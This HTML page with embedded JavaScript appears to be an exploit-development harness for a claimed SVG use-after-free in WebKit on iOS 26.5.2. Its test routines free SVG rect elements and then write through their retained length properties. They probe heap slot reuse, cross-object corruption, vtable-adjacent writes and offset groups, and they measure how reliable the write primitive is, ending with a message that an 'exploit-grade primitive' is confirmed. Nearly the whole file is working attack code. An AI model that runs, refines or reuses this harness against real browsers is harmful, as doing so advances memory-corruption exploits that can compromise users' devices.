<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>SVG UAF v20</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:16px;min-height:100vh}
h2{color:#ff4141;font-size:11px;letter-spacing:2px;text-transform:uppercase}
.sub{color:#555;font-size:10px;margin-bottom:8px}
#controls{display:flex;gap:5px;flex-wrap:wrap;margin-bottom:8px}
button{background:#111;border:1px solid #333;color:#00ff41;padding:5px 12px;cursor:pointer;font-family:monospace;font-size:10px}
button:hover:not(:disabled){border-color:#00ff41}
button:disabled{opacity:.3}
#log{font-size:10px;line-height:1.6;white-space:pre-wrap;word-break:break-all;margin-top:6px}
.ok{color:#00ff41}.bad{color:#ff4141}.inf{color:#ffcc00}.dim{color:#444}.sep{color:#222}
#stage{position:fixed;top:10px;right:10px;width:200px;height:200px;background:#111;border:1px solid #222;z-index:9999;overflow:hidden}
</style>
</head>
<body>
<h2>SVG UAF v20 - cross-object corruption - iOS 26.5.2</h2>
<div class="sub">v20: IsoHeap reuse, live corruption, offset map, vtable-adjacent write</div>
<div id="stage"><svg id="livesvg" width="200" height="200" viewBox="0 0 100 100"></svg></div>
<div id="controls">
  <button onclick="runRUS()">RUS reuse</button>
  <button onclick="runCOR()">COR corrupt</button>
  <button onclick="runVTP()">VTP vtable</button>
  <button onclick="runOFS()">OFS offset</button>
  <button onclick="runCNF()">CNF confirm</button>
  <button onclick="runAll()">RUN ALL</button>
  <button onclick="copyLog()">COPY</button>
  <button onclick="clearLog()">CLR</button>
</div>
<div id="log"></div>
<script>
var SVG_NS = 'http://www.w3.org/2000/svg';
var Lel = document.getElementById('log');
var livesvg = document.getElementById('livesvg');

function log(m, c) {
  var s = document.createElement('span');
  if (c) s.className = c;
  s.textContent = m + '\n';
  Lel.appendChild(s);
  Lel.scrollTop = Lel.scrollHeight;
}
function sep() { log('----------------------------------------------------', 'sep'); }
function raf() { return new Promise(function(r){ requestAnimationFrame(r); }); }
function tick() { return new Promise(function(r){ setTimeout(r, 0); }); }
function micro() { return new Promise(function(r){ queueMicrotask(r); }); }

function copyLog() {
  try {
    navigator.clipboard.writeText(Lel.innerText);
  } catch(e) {
    var a = document.createElement('textarea');
    a.value = Lel.innerText;
    document.body.appendChild(a);
    a.select();
    document.execCommand('copy');
    a.remove();
  }
}
function clearLog() { Lel.innerHTML = ''; }

function dis(d) {
  var btns = document.querySelectorAll('button');
  for (var i = 0; i < btns.length; i++) {
    var fn = btns[i].getAttribute('onclick') || '';
    if (fn.indexOf('copy') === -1 && fn.indexOf('clear') === -1 && fn.indexOf('CLR') === -1) {
      btns[i].disabled = d;
    }
  }
}

window.onerror = function(m, u, l, c) {
  log('[CRASH] ' + m + ' L' + l + ':' + c, 'bad');
  return false;
};

function mkRect(w, h, x, y, rx) {
  w = w || 80; h = h || 80; x = x || 5; y = y || 5; rx = rx || 3;
  var r = document.createElementNS(SVG_NS, 'rect');
  r.setAttribute('x', '' + x);
  r.setAttribute('y', '' + y);
  r.setAttribute('width', '' + w);
  r.setAttribute('height', '' + h);
  r.setAttribute('rx', '' + rx);
  r.setAttribute('fill', 'blue');
  return r;
}

function flush() {
  while (livesvg.firstChild) livesvg.removeChild(livesvg.firstChild);
}

// RUS: IsoHeap reuse - find alloc count to force slot reuse
async function runRUS(q) {
  if (!q) { dis(true); sep(); log('RUS: IsoHeap reuse - find when freed slot gets reused', 'inf'); sep(); }
  log('[*] free A(w=80), alloc 1..256 new rects, check when animLen_A reads new width', 'ok');

  var reuse_at = -1;
  var reuse_val = null;
  var BASE_W = 100;

  flush(); await raf(); await raf();

  var A = mkRect(80);
  livesvg.appendChild(A);
  await raf(); await raf();

  var animW_A = A.width;
  var bv_A = animW_A ? animW_A.baseVal : null;
  var A_w = bv_A ? bv_A.value : null;
  log('  A created: w=' + A_w + ' (expected 80)', 'ok');

  A.remove();
  await micro();

  var freed_read = null;
  try { freed_read = bv_A ? bv_A.value : null; } catch(e) {}
  log('  A freed: animLen_A reads ' + freed_read + ' (should still be 80)', 'ok');

  var alloced = [];
  for (var i = 0; i < 256; i++) {
    var w = BASE_W + i;
    var nr = mkRect(w, w);
    livesvg.appendChild(nr);
    alloced.push(nr);

    var curr = null;
    try { curr = bv_A ? bv_A.value : null; } catch(e) {}

    if (curr !== A_w && curr !== null) {
      reuse_at = i;
      reuse_val = curr;
      log('  [!!] SLOT REUSE at alloc #' + i + ': animLen_A now reads ' + curr, 'bad');
      log('  new rect w=' + w + ' landed in freed slot', 'bad');
      var confirmW = null;
      try { confirmW = alloced[i].width.baseVal.value; } catch(e) {}
      log('  alloced[' + i + '].width.baseVal = ' + confirmW, 'ok');
      break;
    }

    if (i > 0 && i % 64 === 0) {
      log('  after ' + i + ' allocs: animLen_A still reads ' + curr, 'dim');
    }
  }

  if (reuse_at === -1) {
    var final_read = null;
    try { final_read = bv_A ? bv_A.value : null; } catch(e) {}
    log('  no reuse after 256 allocs - animLen_A still reads ' + final_read, 'inf');
    log('  [*] IsoPage bump > 256 rects threshold', 'inf');
  } else {
    log('  RESULT: reuse_at=' + reuse_at + ' reuse_val=' + reuse_val, 'bad');
  }

  flush(); await raf();
  if (!q) dis(false);
  return { reuse_at: reuse_at, reuse_val: reuse_val, A_w: A_w };
}

// COR: live corruption - write via freed A into live B
async function runCOR(q) {
  if (!q) { dis(true); sep(); log('COR: live corruption - write via freed A into live B', 'inf'); sep(); }
  log('[*] free A, write ATTACK via animLen_A, alloc B nearby, check if B shows ATTACK', 'ok');

  var corruptionConfirmed = false;
  var ATTACK = 4242.0;

  // Phase 1: write into freed slot, then alloc many B's looking for reuse
  flush(); await raf(); await raf();

  var A1 = mkRect(80);
  livesvg.appendChild(A1);
  await raf(); await raf();

  var bv_A1 = A1.width ? A1.width.baseVal : null;
  A1.remove();
  await micro();

  var MAGIC = 7654.0;
  try { if (bv_A1) bv_A1.value = MAGIC; } catch(e) {}
  var confirmMagic = null;
  try { confirmMagic = bv_A1 ? bv_A1.value : null; } catch(e) {}
  log('  Phase1: wrote MAGIC=' + MAGIC + ' into freed slot, readback=' + confirmMagic, 'inf');

  var victims = [];
  for (var i = 0; i < 256; i++) {
    var B = mkRect(42 + i);
    livesvg.appendChild(B);
    victims.push(B);

    var curr = null;
    try { curr = bv_A1 ? bv_A1.value : null; } catch(e) {}

    if (curr !== MAGIC && curr !== null && curr !== 0) {
      log('  Phase1: slot reused at i=' + i + ' animLen_A reads ' + curr + ' (B.width=' + (42+i) + ')', 'bad');
      try { if (bv_A1) bv_A1.value = 9999; } catch(e) {}
      var bW = null;
      try { bW = victims[i].width ? victims[i].width.baseVal.value : null; } catch(e) {}
      var bBBox = null;
      try { bBBox = victims[i].getBBox ? victims[i].getBBox().width : null; } catch(e) {}
      log('  wrote 9999 via animLen_A - B.width.baseVal=' + bW + ' B.getBBox().w=' + bBBox, 'bad');
      if (bW === 9999 || bBBox === 9999) {
        corruptionConfirmed = true;
        log('  [!!] LIVE CORRUPTION CONFIRMED: B.width=' + bW + ' without setAttribute!', 'bad');
      }
      break;
    }
  }

  flush(); await raf();

  // Phase 2: adjacent alloc approach
  log('  Phase2: rapid alloc/free pairs to find adjacent heap elements...', 'inf');
  var found = false;

  for (var attempt = 0; attempt < 20 && !found; attempt++) {
    flush(); await raf();

    var A2 = mkRect(80);
    livesvg.appendChild(A2);
    await raf();
    var bv_A2 = A2.width ? A2.width.baseVal : null;

    var B2 = mkRect(55);
    livesvg.appendChild(B2);
    await raf();
    var bv_B2 = B2.width ? B2.width.baseVal : null;
    var B_preW = bv_B2 ? bv_B2.value : null;

    A2.remove();
    await micro();
    try { if (bv_A2) bv_A2.value = ATTACK; } catch(e) {}

    var B_postW = null;
    try { B_postW = bv_B2 ? bv_B2.value : null; } catch(e) {}
    var B_bbox = null;
    try { B_bbox = B2.getBBox ? B2.getBBox().width : null; } catch(e) {}
    var B_native = null;
    try { B_native = B2.width ? B2.width.baseVal.value : null; } catch(e) {}

    if (B_postW === ATTACK || B_bbox === ATTACK || B_native === ATTACK) {
      found = true;
      corruptionConfirmed = true;
      log('  [!!] CROSS-OBJECT CORRUPTION! attempt=' + attempt, 'bad');
      log('    B: bv=' + B_postW + ' bbox=' + B_bbox + ' native=' + B_native, 'bad');
      log('    B shows ATTACK value without setAttribute!', 'bad');
    } else {
      if (attempt < 3) {
        log('  attempt=' + attempt + ': B_postW=' + B_postW + ' bbox=' + B_bbox, 'dim');
      }
    }

    flush(); await raf();
  }

  if (!found) log('  Phase2: no cross-object hit in 20 attempts', 'inf');

  log('[*] COR: corruptionConfirmed=' + corruptionConfirmed, corruptionConfirmed ? 'bad' : 'inf');
  if (!q) dis(false);
  return { corruptionConfirmed: corruptionConfirmed };
}

// VTP: vtable-adjacent write - map sentinel survival into live elements
async function runVTP(q) {
  if (!q) { dis(true); sep(); log('VTP: vtable-adjacent - sentinel survival into live B', 'inf'); sep(); }
  log('[*] write unique sentinels via each gadget, alloc B, check if B shows sentinel', 'ok');

  var SENTINELS = {
    width:  11110000.0,
    height: 22220000.0,
    x:      33330000.0,
    y:      44440000.0,
    rx:     55550000.0,
    ry:     66660000.0
  };
  var sentVals = [11110000.0, 22220000.0, 33330000.0, 44440000.0, 55550000.0, 66660000.0];

  var vtpHit = 0;

  for (var trial = 0; trial < 10; trial++) {
    flush(); await raf(); await raf();

    var A = mkRect(80, 60);
    A.setAttribute('rx', '12');
    A.setAttribute('ry', '7');
    livesvg.appendChild(A);
    await raf(); await raf();

    var g = {
      width:  A.width  ? A.width.baseVal  : null,
      height: A.height ? A.height.baseVal : null,
      x:      A.x      ? A.x.baseVal      : null,
      y:      A.y      ? A.y.baseVal      : null,
      rx:     A.rx     ? A.rx.baseVal     : null,
      ry:     A.ry     ? A.ry.baseVal     : null
    };

    A.remove();
    await micro();

    var names = ['width','height','x','y','rx','ry'];
    for (var ni = 0; ni < names.length; ni++) {
      var nm = names[ni];
      try { if (g[nm]) g[nm].value = SENTINELS[nm]; } catch(e) {}
    }

    var B = mkRect(42, 42);
    livesvg.appendChild(B);
    await micro();

    var B_reads = {};
    try { B_reads.w  = B.width  ? B.width.baseVal.value   : null; } catch(e) {}
    try { B_reads.h  = B.height ? B.height.baseVal.value  : null; } catch(e) {}
    try { B_reads.x  = B.x     ? B.x.baseVal.value        : null; } catch(e) {}
    try { B_reads.y  = B.y     ? B.y.baseVal.value        : null; } catch(e) {}
    try { B_reads.rx = B.rx    ? B.rx.baseVal.value       : null; } catch(e) {}
    try { B_reads.bw = B.getBBox ? B.getBBox().width       : null; } catch(e) {}

    var hits = [];
    var keys = Object.keys(B_reads);
    for (var ki = 0; ki < keys.length; ki++) {
      var v = B_reads[keys[ki]];
      if (sentVals.indexOf(v) !== -1) hits.push(keys[ki] + '=' + v);
    }

    if (hits.length > 0) {
      vtpHit++;
      log('  trial=' + trial + ': [SENTINEL IN B!] ' + hits.join(' '), 'bad');
    } else {
      if (trial < 3) log('  trial=' + trial + ': B=' + JSON.stringify(B_reads) + ' (no sentinel)', 'dim');
    }

    flush(); await raf();
  }

  log('[*] VTP: vtpHit=' + vtpHit, vtpHit > 0 ? 'bad' : 'inf');
  if (!q) dis(false);
  return { vtpHit: vtpHit };
}

// OFS: offset map - cross-gadget interference
async function runOFS(q) {
  if (!q) { dis(true); sep(); log('OFS: offset map - cross-gadget write interference', 'inf'); sep(); }
  log('[*] write via gadget X, read all others - shared reads = shared memory offset', 'ok');

  flush(); await raf(); await raf();

  var A = mkRect(80, 60);
  A.setAttribute('rx', '12');
  A.setAttribute('ry', '7');
  livesvg.appendChild(A);
  await raf(); await raf();

  var gadgetNames = ['width','height','x','y','rx','ry'];
  var gadgets = {
    width:  A.width  ? A.width.baseVal  : null,
    height: A.height ? A.height.baseVal : null,
    x:      A.x      ? A.x.baseVal      : null,
    y:      A.y      ? A.y.baseVal      : null,
    rx:     A.rx     ? A.rx.baseVal     : null,
    ry:     A.ry     ? A.ry.baseVal     : null
  };

  var preVals = {};
  for (var pi = 0; pi < gadgetNames.length; pi++) {
    var pn = gadgetNames[pi];
    try { preVals[pn] = gadgets[pn] ? gadgets[pn].value : null; } catch(e) {}
  }
  log('  pre-free: ' + gadgetNames.map(function(k){ return k+'='+preVals[k]; }).join(' '), 'ok');

  A.remove();
  await micro();

  var postVals = {};
  for (var qi = 0; qi < gadgetNames.length; qi++) {
    var qn = gadgetNames[qi];
    try { postVals[qn] = gadgets[qn] ? gadgets[qn].value : null; } catch(e) {}
  }
  log('  post-free: ' + gadgetNames.map(function(k){ return k+'='+postVals[k]; }).join(' '), 'ok');

  var offsetMap = {};
  var MAGIC_BASE = 111111.0;

  log('  Cross-gadget interference map:', 'inf');

  for (var wi = 0; wi < gadgetNames.length; wi++) {
    var writerName = gadgetNames[wi];
    var writerBV = gadgets[writerName];

    // reset all to pre values
    for (var ri = 0; ri < gadgetNames.length; ri++) {
      var rn = gadgetNames[ri];
      try { if (gadgets[rn]) gadgets[rn].value = preVals[rn]; } catch(e) {}
    }

    var MAGIC = MAGIC_BASE + wi * 1000;
    try { if (writerBV) writerBV.value = MAGIC; } catch(e) {}

    var readbacks = {};
    for (var rri = 0; rri < gadgetNames.length; rri++) {
      var rrn = gadgetNames[rri];
      try { readbacks[rrn] = gadgets[rrn] ? gadgets[rrn].value : null; } catch(e) {}
    }

    var shared = [];
    for (var si = 0; si < gadgetNames.length; si++) {
      var sn = gadgetNames[si];
      var sv = readbacks[sn];
      if (sv !== null && Math.abs(sv - MAGIC) < 0.01) shared.push(sn);
    }

    offsetMap[writerName] = shared;
    log('  write ' + writerName + '=' + MAGIC + ' -> shared: [' + shared.join(',') + ']', 'inf');
  }

  log('  Offset groups:', 'inf');
  var seen = {};
  var groups = [];
  for (var gi = 0; gi < gadgetNames.length; gi++) {
    var gk = gadgetNames[gi];
    var gshared = offsetMap[gk];
    if (!seen[gk] && gshared.length > 1) {
      groups.push(gshared);
      for (var gsi = 0; gsi < gshared.length; gsi++) seen[gshared[gsi]] = true;
      log('  Group: [' + gshared.join(', ') + ']', 'bad');
    }
  }
  if (groups.length === 0) {
    log('  All gadgets write to distinct offsets - max write surface', 'ok');
  }

  flush(); await raf();
  if (!q) dis(false);
  return { offsetMap: offsetMap, groups: groups };
}

// CNF: confirm primitive - 100 iterations
async function runCNF(q) {
  if (!q) { dis(true); sep(); log('CNF: confirm primitive - 100 iterations reliability', 'inf'); sep(); }
  log('[*] free A, write 4 distinct values via width/height/x/y gadgets, read back', 'ok');

  var confirmed = 0;
  var ATTACK_VAL = 31337.0;

  for (var t = 0; t < 100; t++) {
    flush(); await raf();

    var A = mkRect(80);
    livesvg.appendChild(A);
    await raf();

    var bvW = A.width  ? A.width.baseVal  : null;
    var bvH = A.height ? A.height.baseVal : null;
    var bvX = A.x      ? A.x.baseVal      : null;
    var bvY = A.y      ? A.y.baseVal      : null;

    var preW = bvW ? bvW.value : null;

    A.remove();

    try { if (bvW) bvW.value = ATTACK_VAL;     } catch(e) {}
    try { if (bvH) bvH.value = ATTACK_VAL + 1; } catch(e) {}
    try { if (bvX) bvX.value = ATTACK_VAL + 2; } catch(e) {}
    try { if (bvY) bvY.value = ATTACK_VAL + 3; } catch(e) {}

    var rW = null, rH = null, rX = null, rY = null;
    try { rW = bvW ? bvW.value : null; } catch(e) {}
    try { rH = bvH ? bvH.value : null; } catch(e) {}
    try { rX = bvX ? bvX.value : null; } catch(e) {}
    try { rY = bvY ? bvY.value : null; } catch(e) {}

    var ok = (rW === ATTACK_VAL) && (rH === ATTACK_VAL + 1) && (rX === ATTACK_VAL + 2) && (rY === ATTACK_VAL + 3);
    if (ok) confirmed++;

    if (t < 5 || !ok) {
      log('  t' + t + ': pre=' + preW + ' wrote ' + ATTACK_VAL + '+ read(' + rW + ',' + rH + ',' + rX + ',' + rY + ') ' + (ok ? 'OK' : 'FAIL'), ok ? 'ok' : 'bad');
    }
  }

  log('[*] CNF: confirmed=' + confirmed + '/100', 'bad');
  var pct = (confirmed / 100 * 100).toFixed(1);
  log('[*] UAF write reliability: ' + pct + '%', confirmed >= 90 ? 'bad' : 'inf');
  if (confirmed >= 90) {
    log('[!!] exploit-grade primitive confirmed', 'bad');
  }

  if (!q) dis(false);
  return { confirmed: confirmed };
}

// RUN ALL
async function runAll() {
  dis(true); clearLog(); sep();
  log('SVG UAF v20 - cross-object corruption harness', 'inf'); sep();

  var results = {};
  var tests = [
    ['RUS_isoheap_reuse',    runRUS],
    ['COR_live_corruption',  runCOR],
    ['VTP_vtable_adjacent',  runVTP],
    ['OFS_offset_map',       runOFS],
    ['CNF_confirm_primitive',runCNF]
  ];

  for (var i = 0; i < tests.length; i++) {
    var lbl = tests[i][0];
    var fn  = tests[i][1];
    sep();
    log(lbl, 'inf');
    sep();
    try {
      results[lbl] = await fn(true);
    } catch(e) {
      log('[!] ' + lbl + ': ' + e, 'bad');
      results[lbl] = null;
    }
    log('', '');
  }

  sep();
  log('SUMMARY v20', 'inf');
  sep();

  var keys = Object.keys(results);
  for (var ki = 0; ki < keys.length; ki++) {
    var k = keys[ki];
    var r = results[k];
    if (!r) { log('  ' + k + ': ERROR', 'bad'); continue; }
    var v = r.reuse_at !== undefined ? r.reuse_at :
            r.corruptionConfirmed !== undefined ? r.corruptionConfirmed :
            r.vtpHit !== undefined ? r.vtpHit :
            r.groups !== undefined ? r.groups.length :
            r.confirmed !== undefined ? r.confirmed : '?';
    var cls = (typeof v === 'number' && v > 0) || v === true ? 'bad' : 'dim';
    log('  ' + k + ': key=' + v, cls);
  }
  sep();
  dis(false);
}
</script>
</body>
</html>
